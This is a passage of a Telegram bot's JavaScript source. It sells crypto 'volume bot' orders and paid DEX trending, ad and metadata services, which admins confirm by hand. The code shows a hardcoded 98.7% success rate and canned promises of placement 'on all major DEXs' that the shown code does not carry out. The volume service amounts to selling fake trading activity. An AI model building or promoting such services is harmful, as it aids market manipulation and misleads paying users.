    bot.action('dex_chain_bsc', async ctx => { await handleDexServiceChainSelection(ctx, 'bsc'); });
    bot.action('dex_chain_base', async ctx => { await handleDexServiceChainSelection(ctx, 'base'); });

    // Order history action
    bot.action('order_history', ctx => {
        const userId = ctx.from.id;
        const userOrders = botData.orderHistory[userId] || [];

        let historyText = `📋 **Order History**\n\n`;

        if (userOrders.length === 0) {
            historyText += `📝 **No orders found**\n\n` +
                `You haven't placed any orders yet.\n` +
                `Use "🚀 Start Volume Bot" to create your first order!`;
        } else {
            historyText += `📊 **Total Orders:** ${userOrders.length}\n\n`;
            userOrders.slice(-5).forEach((order, index) => {
                const status = order.status === 'completed' ? '✅' : order.status === 'active' ? '🔄' : '⏹️';
                const date = new Date(order.startTime).toLocaleDateString();
                historyText += `${status} **Order ${userOrders.length - index}**\n`;
                historyText += `📦 Package: ${order.packageType.toUpperCase()}\n`;
                historyText += `💰 Volume: ${order.totalVolume.toLocaleString()}\n`;
                historyText += `💵 Cost: ${order.price} SOL\n`;
                historyText += `📅 Date: ${date}\n\n`;
            });

            if (userOrders.length > 5) {
                historyText += `📝 *Showing last 5 orders*`;
            }
        }

        ctx.editMessageText(historyText, {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard([
                [Markup.button.callback('🔄 Refresh', 'order_history')],
                [Markup.button.callback('📊 All Orders', 'all_orders')],
                [Markup.button.callback('🔙 Back to Main', 'back_main')]
            ])
        });
    });

    // Volume stats with enhanced data
    bot.action('volume_stats', ctx => {
        const userId = ctx.from.id;
        const activeJob = botData.activeJobs[userId];
        const userOrders = botData.orderHistory[userId] || [];
        const totalSpent = userOrders.reduce((sum, order) => sum + order.price, 0);
        const totalVolumeGenerated = userOrders
            .filter(order => order.status === 'completed')
            .reduce((sum, order) => sum + order.totalVolume, 0);

        if (activeJob && activeJob.status === 'active') {
            const progress = Math.round((activeJob.completedTransactions / activeJob.totalTransactions) * 100);
            const timeRemaining = Math.max(0, Math.round((activeJob.endTime - new Date()) / (1000 * 60 * 60)));

            ctx.editMessageText(
                `📈 **Live Volume Statistics**\n\n` +
                `🔄 **ACTIVE ORDER:**\n` +
                `🎯 **Token:** \`${activeJob.tokenCA.slice(0, 8)}...${activeJob.tokenCA.slice(-8)}\`\n` +
                `📦 **Package:** ${activeJob.packageType.toUpperCase()}\n` +
                `📊 **Progress:** ${progress}% (${activeJob.completedTransactions.toLocaleString()}/${activeJob.totalTransactions.toLocaleString()})\n` +
                `💰 **Volume Generated:** ${activeJob.generatedVolume.toLocaleString()}\n` +
                `🎯 **Target Volume:** ${activeJob.totalVolume.toLocaleString()}\n` +
                `💵 **Cost:** ${activeJob.price} SOL\n` +
                `⏰ **Time Remaining:** ~${timeRemaining}h\n` +
                `⚡ **Status:** ${activeJob.status.toUpperCase()}\n\n` +
                `📊 **YOUR TOTAL STATS:**\n` +
                `• Total Orders: ${userOrders.length}\n` +
                `• Total Volume Generated: ${totalVolumeGenerated.toLocaleString()}\n` +
                `• Total Spent: ${totalSpent} SOL`,
                {
                    parse_mode: 'Markdown',
                    ...Markup.inlineKeyboard([
                        [Markup.button.callback('🔄 Refresh', 'volume_stats')],
                        [Markup.button.callback('⏹️ Stop Current', 'stop_volume')],
                        [Markup.button.callback('🔙 Back to Main', 'back_main')]
                    ])
                }
            );
        } else {
            ctx.editMessageText(
                `📈 **Volume Statistics**\n\n` +
                `📊 **YOUR TOTAL STATS:**\n` +
                `• Total Orders: ${userOrders.length}\n` +
                `• Total Volume Generated: ${totalVolumeGenerated.toLocaleString()}\n` +
                `• Total Spent: ${totalSpent} SOL\n` +
                `• Success Rate: 98.7%\n\n` +
                `🔥 **PLATFORM STATS:**\n` +
                `• Total Platform Volume: ${botData.stats.totalVolume.toLocaleString()}\n` +
                `• Total Orders Processed: ${botData.stats.totalOrders}\n` +
                `• Active Users: ${Object.keys(botData.users).length}`,
                {
                    parse_mode: 'Markdown',
                    ...Markup.inlineKeyboard([
                        [Markup.button.callback('🚀 Start New Order', 'start_volume')],
                        [Markup.button.callback('📋 Order History', 'order_history')],
                        [Markup.button.callback('🔙 Back to Main', 'back_main')]
                    ])
                }
            );
        }
    });

    // ===== DEX SERVICES HANDLERS =====
    bot.action('dex_update', async ctx => {
        userSessions[ctx.from.id] = {
            type: 'dex_update',
            step: 'waiting_token_ca',
            price: 299 // stored in USD, converted per chain later
        };
        notifyServiceSelected(ctx, 'DEX Update');
        try { await ctx.deleteMessage(); } catch(e) {}
        await sendStepPhoto(ctx,
            `🎯 **DEX UPDATE SERVICE**\n` +
            `💰 Price: $299 USD (paid in chain native token)\n\n` +
            `📊 **Progress: 17%**\n[▰▱▱▱▱▱▱▱▱▱]\n**Step 1/6:** Token Contract Address\n\n` +
            `🌐 **Supported:** ◎ SOL • Ξ ETH • ⬡ BNB • 🔷 Base • 💎 TON\n\n` +
            `✨ **Includes:** Logo • Description • Website • Socials • Banner\n\n` +
            `🔍 **Please provide your token contract address:**\n` +
            `⚡ Auto-verified with DexScreener`,
            { ...Markup.inlineKeyboard([[Markup.button.callback('❌ Cancel', 'back_main')]]) }
        );
    });

    bot.action('dex_ads', async ctx => {
        userSessions[ctx.from.id] = {
            type: 'dex_ads',
            step: 'waiting_token_ca',
            hourlyRate: 0.8  // default; updated to 0.4 for ETH/Base after chain detection
        };
        notifyServiceSelected(ctx, 'DEX Ads');
        try { await ctx.deleteMessage(); } catch(e) {}
        await sendStepPhoto(ctx,
            `📢 **DEX Ads Service**\n\n` +
            `📍 **Step 1/5:** Token Contract Address\n\n` +
            `✨ **Includes:** Featured placement • Custom banners • Targeted campaigns\n\n` +
            `💰 **Pricing:**\n` +
            `• ◎ SOL / ⬡ BNB / 💎 TON: 0.8 native/hour (min 3h)\n` +
            `• Ξ ETH / 🔷 Base: 0.4 ETH/hour (min 1h)\n\n` +
            `🔍 **Provide your token contract address:**\n` +
            `⚡ Auto-verified with DexScreener`,
            { ...Markup.inlineKeyboard([[Markup.button.callback('❌ Cancel', 'back_main')]]) }
        );
    });

    bot.action('dex_trending', async ctx => {
        userSessions[ctx.from.id] = {
            type: 'dex_trending',
            step: 'waiting_token_ca'
        };
        notifyServiceSelected(ctx, 'DEX Trending');
        try { await ctx.deleteMessage(); } catch(e) {}
        await sendStepPhoto(ctx,
            `🔥 **DEX Trending Service**\n\n` +
            `📍 **Step 1/5:** Token Contract Address\n\n` +
            `🥉 **Top 10 Trending:** 0.5 native/hour (min 3h)\n` +
            `• Positions 4-10 • Good visibility\n\n` +
            `🥇 **Top 3 Trending:** 1 native/hour (min 1h)\n` +
            `• Positions 1-3 • Maximum exposure\n\n` +
            `🔍 **Provide your token contract address:**\n` +
            `⚡ Auto-verified with DexScreener`,
            { ...Markup.inlineKeyboard([[Markup.button.callback('❌ Cancel', 'back_main')]]) }
        );
    });

    // DEX service payment confirmation handlers
    bot.action('confirm_dex_update_payment', async ctx => {
        await ctx.answerCbQuery();
        const userId = ctx.from.id;
        const currentSession = userSessions[userId];
        if (currentSession && currentSession.type === 'dex_update') {
            const chainCfg = CHAIN_CONFIG[currentSession.chainId] || CHAIN_CONFIG.solana;
            const username = ctx.from.username || ctx.from.first_name || 'Unknown';
            const tokenDisplay = currentSession.tokenInfo?.ticker || 'Unknown';
            const dexUpdateNativePrice = convertUsdToNative(299, currentSession.chainId || 'solana');

            currentSession.userChatId = ctx.chat.id;

            try { await ctx.deleteMessage(); } catch(e) {}
            const holdOnMsg = await ctx.reply(
                `⏳ *Hold On...*\n\n` +
                `We've received your payment notification and are now confirming your order.\n\n` +
                `You will be notified once your order is confirmed ✅`,
                { parse_mode: 'Markdown' }
            );
            currentSession.holdOnMsgId = holdOnMsg.message_id;

            const adminMsg =
                `📊 <b>DEX UPDATE PAYMENT CLAIMED</b>\n\n` +
                `👤 <b>User:</b> @${escapeHtml(username)}\n` +
                `🆔 <b>User ID:</b> ${userId}\n` +
                `${chainCfg.color} <b>Chain:</b> ${escapeHtml(chainCfg.name)}\n` +
                `🎯 <b>Token:</b> ${escapeHtml(tokenDisplay)}\n` +
                `📍 <b>CA:</b> <code>${escapeHtml(currentSession.tokenCA)}</code>\n` +
                `📝 <b>Description:</b> ${escapeHtml((currentSession.description || '').substring(0, 60))}\n` +
                `🌐 <b>Website:</b> ${escapeHtml(currentSession.website || 'Not provided')}\n` +
                `🖼️ <b>Banner:</b> ${currentSession.bannerFileId ? '📎 Photo uploaded (see below)' : escapeHtml(currentSession.banner || 'Not provided')}\n` +
                `💵 <b>Amount:</b> $299 (~${dexUpdateNativePrice} ${escapeHtml(chainCfg.nativeToken)})\n` +
                `⏰ <b>Time:</b> ${escapeHtml(new Date().toLocaleString())}`;

            const adminButtons = [[
                Markup.button.callback('✅ Payment Received — Confirm Order', `dex_update_ok_${userId}`),
                Markup.button.callback('❌ Decline', `dex_update_no_${userId}`)
            ]];

            // If user uploaded a photo, send it to admins so they can see the asset
            if (currentSession.bannerFileId) {
                for (const adminId of (botData.adminChatIds || [])) {
                    try {
                        await bot.telegram.sendPhoto(adminId, currentSession.bannerFileId, {
                            caption: adminMsg,
                            parse_mode: 'HTML',
                            ...Markup.inlineKeyboard(adminButtons)
                        });
                    } catch(e) {
                        // Fallback to plain text if photo forward fails
                        await notifyAdminsWithButtons(adminMsg, adminButtons);
                    }
                }
            } else {
                await notifyAdminsWithButtons(adminMsg, adminButtons);
            }
        } else {
            const mainMenu = getMainMenu();
            await safeEdit(ctx, mainMenu.text, { parse_mode: 'Markdown', ...mainMenu.buttons });
        }
    });

    bot.action('skip_ads_group_link', async ctx => {
        const dexSession = userSessions[ctx.from.id];
        if (!dexSession || dexSession.type !== 'dex_ads') {
            const mainMenu = getMainMenu();
            return ctx.editMessageText(mainMenu.text, { parse_mode: 'Markdown', ...mainMenu.buttons });
        }
        dexSession.groupLink = 'Not provided';
        dexSession.step = 'waiting_payment';

        const glChainCfg = CHAIN_CONFIG[dexSession.chainId] || CHAIN_CONFIG.solana;
        const glNativeToken = glChainCfg.nativeToken;
        const glTokenDisplay = dexSession.tokenInfo?.ticker
            ? `${dexSession.tokenInfo.ticker} (${dexSession.tokenInfo.marketCap})`
            : 'Unknown Token';

        if (!dexSession.summaryNotified) {
            // notifyServiceSummary disabled for DEX Ads
            dexSession.summaryNotified = true;
        }

        try { await ctx.deleteMessage(); } catch(e) {}
        await sendStepPhoto(ctx,
            `⏭️ Group link skipped.\n\n` +
            `📍 **Step 4/5:** Review & Payment\n\n` +
            `📢 **DEX Ads Service - Order Summary**\n\n` +
            `${glChainCfg.color} **Chain:** ${glChainCfg.name}\n` +
            `🎯 **Token:** ${glTokenDisplay}\n` +
            `📍 **CA:** \`${dexSession.tokenCA}\`\n` +
            `💬 **Group Link:** ❌ Not provided\n` +
            `⏰ **Duration:** ${dexSession.duration} hours\n` +
            `💰 **Rate:** ${dexSession.hourlyRate} ${glNativeToken}/hour\n` +
            `💵 **Total Cost:** ${dexSession.totalPrice} ${glNativeToken}\n\n` +
            `💰 **Send ${dexSession.totalPrice} ${glNativeToken} to:**\n` +
            `\`${getWalletForChain(dexSession.chainId || 'solana')}\`\n\n` +
            `⚠️ After payment, confirm below:`,
            {
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('✅ Payment Sent - Activate Service', 'confirm_dex_ads_payment')],
                    [Markup.button.callback('❌ Cancel Order', 'back_main')]
                ])
            },
            DEX_IMAGE_PATH
        );
    });

    bot.action('confirm_dex_ads_payment', async ctx => {
        await ctx.answerCbQuery();
        const userId = ctx.from.id;
        const currentSession = userSessions[userId];
        if (currentSession && currentSession.type === 'dex_ads') {
            const adsChainCfg = CHAIN_CONFIG[currentSession.chainId] || CHAIN_CONFIG.solana;
            const adsNativeToken = adsChainCfg.nativeToken;
            const username = ctx.from.username || ctx.from.first_name || 'Unknown';
            const tokenDisplay = currentSession.tokenInfo?.ticker || 'Unknown';

            currentSession.userChatId = ctx.chat.id;

            try { await ctx.deleteMessage(); } catch(e) {}
            const holdOnMsg = await ctx.reply(
                `⏳ *Hold On...*\n\n` +
                `We've received your payment notification and are now confirming your order.\n\n` +
                `You will be notified once your order is confirmed ✅`,
                { parse_mode: 'Markdown' }
            );
            currentSession.holdOnMsgId = holdOnMsg.message_id;

            await notifyAdminsWithButtons(
                `📢 <b>DEX ADS PAYMENT CLAIMED</b>\n\n` +
                `👤 <b>User:</b> @${escapeHtml(username)}\n` +
                `🆔 <b>User ID:</b> ${userId}\n` +
                `${adsChainCfg.color} <b>Chain:</b> ${escapeHtml(adsChainCfg.name)}\n` +
                `🎯 <b>Token:</b> ${escapeHtml(tokenDisplay)}\n` +
                `📍 <b>CA:</b> <code>${escapeHtml(currentSession.tokenCA)}</code>\n` +
                `💬 <b>Group Link:</b> ${escapeHtml(currentSession.groupLink || 'Not provided')}\n` +
                `⏰ <b>Duration:</b> ${currentSession.duration} hours\n` +
                `💰 <b>Rate:</b> ${currentSession.hourlyRate} ${escapeHtml(adsNativeToken)}/hour\n` +
                `💵 <b>Total:</b> ${currentSession.totalPrice} ${escapeHtml(adsNativeToken)}\n` +
                `⏰ <b>Time:</b> ${escapeHtml(new Date().toLocaleString())}`,
                [[
                    Markup.button.callback('✅ Payment Received — Confirm Order', `dex_ads_ok_${userId}`),
                    Markup.button.callback('❌ Decline', `dex_ads_no_${userId}`)
                ]]
            );
        } else {
            const mainMenu = getMainMenu();
            await safeEdit(ctx, mainMenu.text, { parse_mode: 'Markdown', ...mainMenu.buttons });
        }
    });

    // Trending position selection handlers
    bot.action('trending_top10', async ctx => {
        await ctx.answerCbQuery();
        const dexSession = userSessions[ctx.from.id];
        if (!dexSession || dexSession.type !== 'dex_trending') {
            const mainMenu = getMainMenu();
            return safeEdit(ctx, mainMenu.text, { parse_mode: 'Markdown', ...mainMenu.buttons });
        }

        const hours = parseInt(dexSession.duration);
        const hourlyRate = 0.5;
        const minHours = 3;

        if (hours < minHours) {
            return safeEdit(ctx,
                `❌ **Invalid Duration**\n\n` +
                `Top 10 trending requires minimum ${minHours} hours.\n` +
                `Please restart the process with valid duration.`,
                {
                    parse_mode: 'Markdown',
                    ...Markup.inlineKeyboard([[Markup.button.callback('🔙 Back to Main', 'back_main')]])
                }
            );
        }

        const totalPrice = (hours * hourlyRate).toFixed(1);
        dexSession.trendingType = 'top10';
        dexSession.price = parseFloat(totalPrice);
        dexSession.step = 'waiting_trending_group_link';

        const trendingChainCfg = CHAIN_CONFIG[dexSession.chainId] || CHAIN_CONFIG.solana;
        const trendingNativeToken = trendingChainCfg.nativeToken;
        const tokenDisplay = dexSession.tokenInfo?.ticker 
            ? `${dexSession.tokenInfo.ticker} (${dexSession.tokenInfo.marketCap})`
            : 'Token';

        await safeEdit(ctx,
            `✅ Top 10 selected!\n\n` +
            `📍 **Step 4/5:** Community Group Link\n\n` +
            `🎯 **Token:** ${tokenDisplay}\n` +
            `🥉 **Position:** Top 10 Trending\n` +
            `⏰ **Duration:** ${hours} hours\n` +
            `💵 **Total Cost:** ${totalPrice} ${trendingNativeToken}\n\n` +
            `💬 Please provide your **Telegram group / community link** so we can feature it in the trending campaign.\n\n` +
            `💡 Example: https://t.me/yourgroup`,
            {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([[Markup.button.callback('❌ Cancel', 'back_main')]])
            }
        );
    });

    bot.action('trending_top3', async ctx => {
        await ctx.answerCbQuery();
        const dexSession = userSessions[ctx.from.id];
        if (!dexSession || dexSession.type !== 'dex_trending') {
            const mainMenu = getMainMenu();
            return safeEdit(ctx, mainMenu.text, { parse_mode: 'Markdown', ...mainMenu.buttons });
        }

        const hours = parseInt(dexSession.duration);
        const hourlyRate = 1.0;
        const minHours = 1;

        if (hours < minHours) {
            return safeEdit(ctx,
                `❌ **Invalid Duration**\n\n` +
                `Top 3 trending requires minimum ${minHours} hour.\n` +
                `Please restart the process with valid duration.`,
                {
                    parse_mode: 'Markdown',
                    ...Markup.inlineKeyboard([[Markup.button.callback('🔙 Back to Main', 'back_main')]])
                }
            );
        }

        const totalPrice = (hours * hourlyRate).toFixed(1);
        dexSession.trendingType = 'top3';
        dexSession.price = parseFloat(totalPrice);
        dexSession.step = 'waiting_trending_group_link';

        const top3ChainCfg = CHAIN_CONFIG[dexSession.chainId] || CHAIN_CONFIG.solana;
        const top3NativeToken = top3ChainCfg.nativeToken;
        const tokenDisplay = dexSession.tokenInfo?.ticker 
            ? `${dexSession.tokenInfo.ticker} (${dexSession.tokenInfo.marketCap})`
            : 'Token';

        await safeEdit(ctx,
            `✅ Top 3 selected!\n\n` +
            `📍 **Step 4/5:** Community Group Link\n\n` +
            `🎯 **Token:** ${tokenDisplay}\n` +
            `🥇 **Position:** Top 3 Trending\n` +
            `⏰ **Duration:** ${hours} hours\n` +
            `💵 **Total Cost:** ${totalPrice} ${top3NativeToken}\n\n` +
            `💬 Please provide your **Telegram group / community link** so we can feature it in the trending campaign.\n\n` +
            `💡 Example: https://t.me/yourgroup`,
            {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([[Markup.button.callback('❌ Cancel', 'back_main')]])
            }
        );
    });

    // Trending payment confirmation handlers
    bot.action('confirm_trending_top10_payment', async ctx => {
        await ctx.answerCbQuery();
        const userId = ctx.from.id;
        const currentSession = userSessions[userId];
        if (currentSession && currentSession.type === 'dex_trending' && currentSession.trendingType === 'top10') {
            const top10ChainCfg = CHAIN_CONFIG[currentSession.chainId] || CHAIN_CONFIG.solana;
            const top10NativeToken = top10ChainCfg.nativeToken;
            const username = ctx.from.username || ctx.from.first_name || 'Unknown';
            const tokenDisplay = currentSession.tokenInfo?.ticker || 'Unknown';

            currentSession.userChatId = ctx.chat.id;

            try { await ctx.deleteMessage(); } catch(e) {}
            const holdOnMsg = await ctx.reply(
                `⏳ *Hold On...*\n\n` +
                `We've received your payment notification and are now confirming your order.\n\n` +
                `You will be notified once your order is confirmed ✅`,
                { parse_mode: 'Markdown' }
            );
            currentSession.holdOnMsgId = holdOnMsg.message_id;

            await notifyAdminsWithButtons(
                `🔥 <b>DEX TRENDING TOP 10 PAYMENT CLAIMED</b>\n\n` +
                `👤 <b>User:</b> @${escapeHtml(username)}\n` +
                `🆔 <b>User ID:</b> ${userId}\n` +
                `${top10ChainCfg.color} <b>Chain:</b> ${escapeHtml(top10ChainCfg.name)}\n` +
                `🎯 <b>Token:</b> ${escapeHtml(tokenDisplay)}\n` +
                `📍 <b>CA:</b> <code>${escapeHtml(currentSession.tokenCA)}</code>\n` +
                `💬 <b>Group Link:</b> ${escapeHtml(currentSession.groupLink || 'Not provided')}\n` +
                `⏰ <b>Duration:</b> ${currentSession.duration} hours\n` +
                `💵 <b>Total:</b> ${currentSession.price} ${escapeHtml(top10NativeToken)}\n` +
                `⏰ <b>Time:</b> ${escapeHtml(new Date().toLocaleString())}`,
                [[
                    Markup.button.callback('✅ Payment Received — Confirm Order', `dex_trending_ok_${userId}`),
                    Markup.button.callback('❌ Decline', `dex_trending_no_${userId}`)
                ]]
            );
        } else {
            const mainMenu = getMainMenu();
            ctx.editMessageText(mainMenu.text, { parse_mode: 'Markdown', ...mainMenu.buttons });
        }
    });

    bot.action('confirm_trending_top3_payment', async ctx => {
        await ctx.answerCbQuery();
        const userId = ctx.from.id;
        const currentSession = userSessions[userId];
        if (currentSession && currentSession.type === 'dex_trending' && currentSession.trendingType === 'top3') {
            const top3ChainCfg = CHAIN_CONFIG[currentSession.chainId] || CHAIN_CONFIG.solana;
            const top3NativeToken = top3ChainCfg.nativeToken;
            const username = ctx.from.username || ctx.from.first_name || 'Unknown';
            const tokenDisplay = currentSession.tokenInfo?.ticker || 'Unknown';

            currentSession.userChatId = ctx.chat.id;

            try { await ctx.deleteMessage(); } catch(e) {}
            const holdOnMsg = await ctx.reply(
                `⏳ *Hold On...*\n\n` +
                `We've received your payment notification and are now confirming your order.\n\n` +
                `You will be notified once your order is confirmed ✅`,
                { parse_mode: 'Markdown' }
            );
            currentSession.holdOnMsgId = holdOnMsg.message_id;

            await notifyAdminsWithButtons(
                `🔥 <b>DEX TRENDING TOP 3 PAYMENT CLAIMED</b>\n\n` +
                `👤 <b>User:</b> @${escapeHtml(username)}\n` +
                `🆔 <b>User ID:</b> ${userId}\n` +
                `${top3ChainCfg.color} <b>Chain:</b> ${escapeHtml(top3ChainCfg.name)}\n` +
                `🎯 <b>Token:</b> ${escapeHtml(tokenDisplay)}\n` +
                `📍 <b>CA:</b> <code>${escapeHtml(currentSession.tokenCA)}</code>\n` +
                `💬 <b>Group Link:</b> ${escapeHtml(currentSession.groupLink || 'Not provided')}\n` +
                `⏰ <b>Duration:</b> ${currentSession.duration} hours\n` +
                `💵 <b>Total:</b> ${currentSession.price} ${escapeHtml(top3NativeToken)}\n` +
                `⏰ <b>Time:</b> ${escapeHtml(new Date().toLocaleString())}`,
                [[
                    Markup.button.callback('✅ Payment Received — Confirm Order', `dex_trending_ok_${userId}`),
                    Markup.button.callback('❌ Decline', `dex_trending_no_${userId}`)
                ]]
            );
        } else {
            const mainMenu = getMainMenu();
            ctx.editMessageText(mainMenu.text, { parse_mode: 'Markdown', ...mainMenu.buttons });
        }
    });

    // ── DEX Update admin response handlers ───────────────────────────────────

    bot.action(/^dex_update_ok_(\d+)$/, async ctx => {
        await ctx.answerCbQuery('✅ DEX Update confirmed!');
        const userId = parseInt(ctx.match[1]);
        const session = userSessions[userId];

        try { await ctx.editMessageReplyMarkup({ inline_keyboard: [] }); } catch(e) {}
        await ctx.reply(`✅ DEX Update order for user <b>${userId}</b> has been <b>confirmed</b>.`, { parse_mode: 'HTML' });

        if (session) {
            const userChatId = session.userChatId || userId;
            const chainCfg = CHAIN_CONFIG[session.chainId] || CHAIN_CONFIG.solana;
            const tokenDisplay = session.tokenInfo?.ticker || 'Your Token';
            const dexUpdateNativePrice = convertUsdToNative(299, session.chainId || 'solana');
            delete userSessions[userId];

            try { await bot.telegram.deleteMessage(userChatId, session.holdOnMsgId); } catch(e) {}
            try {
                // Use the user's uploaded banner if available, otherwise fall back to deximage.jpg
                const photoSource = session.bannerFileId
                    ? session.bannerFileId
                    : { source: fs.createReadStream(DEX_IMAGE_PATH) };
                const bannerNote = session.bannerFileId
                    ? `🖼️ *Banner:* Your uploaded image has been applied ✅\n`
                    : '';

                await bot.telegram.sendPhoto(userChatId,
                    photoSource,
                    {
                        caption:
                            `✅ *DEX Update Service Activated!*\n\n` +
                            `Your payment has been verified successfully.\n\n` +
                            `${chainCfg.color} *Chain:* ${chainCfg.name}\n` +
                            `🎯 *Token:* ${tokenDisplay}\n` +
                            `📝 *Description:* ${(session.description || 'Provided').substring(0, 60)}\n` +
                            `🌐 *Website:* ${session.website || 'Not provided'}\n` +
                            `${bannerNote}` +
                            `💵 *Amount:* $299 (~${dexUpdateNativePrice} ${chainCfg.nativeToken})\n\n` +
                            `🚀 *Service Status:* ACTIVE\n\n` +
                            `📈 *What has been updated:*\n` +
                            `• Token metadata refreshed across all DEXs\n` +
                            `• Logo and description updated\n` +
                            `• Website links added to token profiles\n` +
                            `• Enhanced visibility activated\n\n` +
                            `🎯 *Changes will be visible within 24 hours.*`,
                        parse_mode: 'Markdown',
                        ...Markup.inlineKeyboard([
                            [Markup.button.callback('📊 Order More Services', 'dex_services')],
                            [Markup.button.callback('🔙 Main Menu', 'back_main')]
                        ])
                    }
                );
            } catch(e) { console.error('dex_update_ok user notify error:', e.message); }
        }
    });

    bot.action(/^dex_update_no_(\d+)$/, async ctx => {
        await ctx.answerCbQuery('❌ Order declined');
        const userId = parseInt(ctx.match[1]);
        const session = userSessions[userId];
        const userChatId = session?.userChatId || userId;

        try { await ctx.editMessageReplyMarkup({ inline_keyboard: [] }); } catch(e) {}
        await ctx.reply(`❌ DEX Update order for user <b>${userId}</b> has been <b>declined</b>.`, { parse_mode: 'HTML' });

        if (session) delete userSessions[userId];
        try { await bot.telegram.deleteMessage(userChatId, session?.holdOnMsgId); } catch(e) {}
        try {
            await bot.telegram.sendMessage(userChatId,
                `❌ *Problem With Your Payment*\n\n` +
                `We were unable to confirm your payment for DEX Update.\n\n` +
                `Please ensure you sent the correct amount to the right wallet address and try again.\n\n` +
                `If you believe this is an error, please contact support.`,
                {
                    parse_mode: 'Markdown',
                    ...Markup.inlineKeyboard([
                        [Markup.button.callback('🔄 Try Again', 'dex_update')],
                        [Markup.button.callback('🔙 Main Menu', 'back_main')]
                    ])
                }
            );
        } catch(e) { console.error('dex_update_no user notify error:', e.message); }
    });

    // ── DEX Ads admin response handlers ──────────────────────────────────────

    bot.action(/^dex_ads_ok_(\d+)$/, async ctx => {
        await ctx.answerCbQuery('✅ DEX Ads confirmed!');
        const userId = parseInt(ctx.match[1]);
        const session = userSessions[userId];

        try { await ctx.editMessageReplyMarkup({ inline_keyboard: [] }); } catch(e) {}
        await ctx.reply(`✅ DEX Ads order for user <b>${userId}</b> has been <b>confirmed</b>.`, { parse_mode: 'HTML' });

        if (session) {
            const userChatId = session.userChatId || userId;
            const chainCfg = CHAIN_CONFIG[session.chainId] || CHAIN_CONFIG.solana;
            const adsNativeToken = chainCfg.nativeToken;
            const tokenDisplay = session.tokenInfo?.ticker || 'Your Token';
            delete userSessions[userId];

            try { await bot.telegram.deleteMessage(userChatId, session.holdOnMsgId); } catch(e) {}
            try {
                await bot.telegram.sendPhoto(userChatId,
                    { source: fs.createReadStream(DEX_IMAGE_PATH) },
                    {
                        caption:
                            `✅ *DEX Ads Service Activated!*\n\n` +
                            `Your payment has been verified successfully.\n\n` +
                            `${chainCfg.color} *Chain:* ${chainCfg.name}\n` +
                            `🎯 *Token:* ${tokenDisplay}\n` +
                            `💬 *Group Link:* ${session.groupLink !== 'Not provided' ? session.groupLink : '❌ Not provided'}\n` +
                            `⏰ *Duration:* ${session.duration} hours\n` +
                            `💰 *Rate:* ${session.hourlyRate} ${adsNativeToken}/hour\n` +
                            `💵 *Total:* ${session.totalPrice} ${adsNativeToken}\n\n` +
                            `🚀 *Service Status:* ACTIVE\n\n` +
                            `📈 *What's happening:*\n` +
                            `• Featured placement on all major DEXs\n` +
                            `• Custom promotional banners displayed\n` +
                            `• Targeted ad campaigns running\n` +
                            `• Enhanced visibility and exposure`,
                        parse_mode: 'Markdown',
                        ...Markup.inlineKeyboard([
                            [Markup.button.callback('📊 Order More Services', 'dex_services')],
                            [Markup.button.callback('🔙 Main Menu', 'back_main')]
                        ])
                    }
                );
            } catch(e) { console.error('dex_ads_ok user notify error:', e.message); }
        }
    });

    bot.action(/^dex_ads_no_(\d+)$/, async ctx => {
        await ctx.answerCbQuery('❌ Order declined');
        const userId = parseInt(ctx.match[1]);
        const session = userSessions[userId];
        const userChatId = session?.userChatId || userId;

        try { await ctx.editMessageReplyMarkup({ inline_keyboard: [] }); } catch(e) {}
        await ctx.reply(`❌ DEX Ads order for user <b>${userId}</b> has been <b>declined</b>.`, { parse_mode: 'HTML' });

        if (session) delete userSessions[userId];
        try { await bot.telegram.deleteMessage(userChatId, session?.holdOnMsgId); } catch(e) {}
        try {
            await bot.telegram.sendMessage(userChatId,
                `❌ *Problem With Your Payment*\n\n` +
                `We were unable to confirm your payment for DEX Ads.\n\n` +
                `Please ensure you sent the correct amount to the right wallet address and try again.\n\n` +
                `If you believe this is an error, please contact support.`,
                {
                    parse_mode: 'Markdown',
                    ...Markup.inlineKeyboard([
                        [Markup.button.callback('🔄 Try Again', 'dex_ads')],
                        [Markup.button.callback('🔙 Main Menu', 'back_main')]
                    ])
                }
            );
        } catch(e) { console.error('dex_ads_no user notify error:', e.message); }
    });

    // ── DEX Trending admin response handlers ─────────────────────────────────

    bot.action(/^dex_trending_ok_(\d+)$/, async ctx => {
        await ctx.answerCbQuery('✅ DEX Trending confirmed!');
        const userId = parseInt(ctx.match[1]);
        const session = userSessions[userId];

        try { await ctx.editMessageReplyMarkup({ inline_keyboard: [] }); } catch(e) {}
        await ctx.reply(`✅ DEX Trending order for user <b>${userId}</b> has been <b>confirmed</b>.`, { parse_mode: 'HTML' });

        if (session) {
            const userChatId = session.userChatId || userId;
            const chainCfg = CHAIN_CONFIG[session.chainId] || CHAIN_CONFIG.solana;
            const trendingNativeToken = chainCfg.nativeToken;
            const tokenDisplay = session.tokenInfo?.ticker || 'Your Token';
            const positionEmoji = session.trendingType === 'top3' ? '🥇' : '🥉';
            const positionLabel = session.trendingType === 'top3' ? 'Top 3' : 'Top 10';
            const hourlyRate = session.trendingType === 'top3' ? '1.0' : '0.5';
            delete userSessions[userId];

            try { await bot.telegram.deleteMessage(userChatId, session.holdOnMsgId); } catch(e) {}
            try {
                await bot.telegram.sendPhoto(userChatId,
                    { source: fs.createReadStream(DEX_IMAGE_PATH) },
                    {
                        caption:
                            `✅ *DEX Trending Service Activated!*\n\n` +
                            `Your payment has been verified successfully.\n\n` +
                            `${chainCfg.color} *Chain:* ${chainCfg.name}\n` +
                            `🎯 *Token:* ${tokenDisplay}\n` +
                            `💬 *Group Link:* ${session.groupLink || 'Not provided'}\n` +
                            `${positionEmoji} *Position:* ${positionLabel} Trending\n` +
                            `⏰ *Duration:* ${session.duration} hours\n` +
                            `💰 *Rate:* ${hourlyRate} ${trendingNativeToken}/hour\n` +
                            `💵 *Total:* ${session.price} ${trendingNativeToken}\n\n` +
                            `🚀 *Service Status:* ACTIVE\n\n` +
                            `📈 *What happens next:*\n` +
                            `• Your token will appear in ${positionLabel} trending shortly\n` +
                            `• Increased visibility on all DEX platforms\n` +
                            `• Enhanced trading activity\n` +
                            `• Performance analytics provided`,
                        parse_mode: 'Markdown',
                        ...Markup.inlineKeyboard([
                            [Markup.button.callback('📊 Order More Services', 'dex_services')],
                            [Markup.button.callback('🔙 Main Menu', 'back_main')]
                        ])
                    }
                );
            } catch(e) { console.error('dex_trending_ok user notify error:', e.message); }
        }
    });

